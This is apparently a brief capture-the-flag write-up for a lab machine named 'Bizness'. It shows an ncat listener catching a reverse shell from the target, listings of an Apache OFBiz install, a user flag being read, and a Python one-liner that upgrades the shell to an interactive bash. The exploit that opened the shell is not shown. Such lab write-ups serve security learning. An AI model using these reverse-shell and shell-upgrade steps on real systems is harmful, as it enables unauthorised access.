# Bizness





We have the access to the machine
```
❯ ncat -lvnp 9999
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.11.252:42908.
ls
APACHE2_HEADER
applications
build
build.gradle
common.gradle
config
docker
Dockerfile
DOCKER.md
docs
framework
gradle
gradle.properties
gradlew
gradlew.bat
init-gradle-wrapper.bat
INSTALL
lib
LICENSE
NOTICE
npm-shrinkwrap.json
OPTIONAL_LIBRARIES
plugins
README.adoc
runtime
SECURITY.md
settings.gradle
themes
VERSION
pwd
/opt/ofbiz
ls /home
ofbiz
ls /home/ofbiz
user.txt
cat /home/ofbiz/user.txt
18c7f3fefb466e78be6db5af567fc81d
```

the shell it's not clear at all, let's make it clear
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

That's better !
```
ofbiz@bizness:/opt/ofbiz$
```


